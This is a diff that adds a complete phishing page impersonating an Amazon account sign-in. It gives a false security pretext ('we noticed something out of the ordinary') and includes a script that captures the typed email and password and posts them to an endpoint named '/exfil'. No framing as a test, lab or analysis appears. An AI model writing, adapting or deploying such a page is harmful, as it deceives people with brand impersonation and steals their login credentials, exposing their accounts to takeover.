@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Account sign in</title>
+</head>
+<body>
+    <h1>Amazon account sign in</h1>
+    <p>We noticed something out of the ordinary and would like you to sign in again so we can keep things safe.</p>
+
+    <form id="signin-form">
+        <label>Email: <input type="text" name="email"></label><br>
+        <label>Password: <input type="password" name="password"></label><br>
+        <button type="submit">Sign in</button>
+    </form>
+
+    <script>
+        document.getElementById("signin-form").addEventListener("submit", (event) => {
+            event.preventDefault();
+            const email = event.target.email.value;
+            const password = event.target.password.value;
+            fetch("/exfil", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password }),
+            });
+        });
+    </script>
+</body>
+</html>
